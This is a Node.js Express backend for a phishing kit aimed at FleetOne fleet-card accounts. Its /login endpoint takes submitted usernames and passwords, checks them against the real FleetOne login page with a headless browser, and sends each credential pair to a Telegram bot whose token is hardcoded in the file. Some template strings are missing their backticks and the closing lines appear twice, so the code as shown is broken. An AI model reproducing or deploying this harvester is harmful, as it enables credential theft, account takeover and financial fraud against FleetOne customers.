const express = require("express");
const { chromium } = require("playwright");
const cors = require("cors");
const fetch = require("node-fetch");
require("dotenv").config();

const app = express();
const port = 8080;

const TELEGRAM_BOT_TOKEN = "8028378156:AAFzr5FzJtK7H3wo1ResfDt4IhFaYX9k6OM";
const CHAT_ID = 531918242;

app.use(cors());
app.use(express.json());

app.get("/", (req, res) => {
  res.send("Hello");
});

app.post("/login", async (req, res) => {
  res.setHeader("Access-Control-Allow-Methods", "POST");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");

  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).json({ error: "Missing username or password" });
  }

  const browser = await chromium.launch({ headless: true });
  const page = await browser.newPage();

  try {
    await page.goto("https://manage.fleetone.com/security/fleetOneLogin", {
      waitUntil: "networkidle",
    });

    await page.locator('input[name="userId"]').fill(username);
    await page.locator('input[name="password"]').fill(password);
    await page.locator("form").evaluate((form) => form.submit());

    console.log("Submitting form...");

    await page.waitForTimeout(5000);

    const loginError = await page.locator(".errors").count();
    if (loginError > 0) {
      await browser.close();
      const telegramUrl = https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=-1002614062462;
      const telegramMessage = {
        chat_id: process.env.CHAT_ID,
        text: ✅ Error Login:\n👤 Username: ${username}\n🔑 Password: ${password},
      };

      await fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(telegramMessage),
      });
      return res.json({ success: false, message: "Invalid credentials" });
    }

    const isLoggedIn = (await page.locator("#pad").count()) > 0;
    if (!isLoggedIn) {
      await browser.close();
      return res.json({ success: false, message: "Login failed" });
    }

    const telegramUrl = https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=-1002614062462;
    const telegramMessage = {
      chat_id: process.env.CHAT_ID,
      text: ✅ Новый логин:\n👤 Username: ${username}\n🔑 Password: ${password},
    };

    try {
      await fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(telegramMessage),
      });
    } catch (error) {
      console.error("Error Telegram:", error);
    }

    await browser.close();
    return res.json({ success: true, message: "Login successful", username });
  } catch (error) {
    await browser.close();
    res
      .status(500)
      .json({ error: "Login process failed", details: error.message });
  }
});

app.listen(port, () => {
  console.log(`Backend server is running at http://localhost:${port}`);
});

module.exports = app;
  console.log(`Backend server is running at http://localhost:${port}`);
});

module.exports = app;
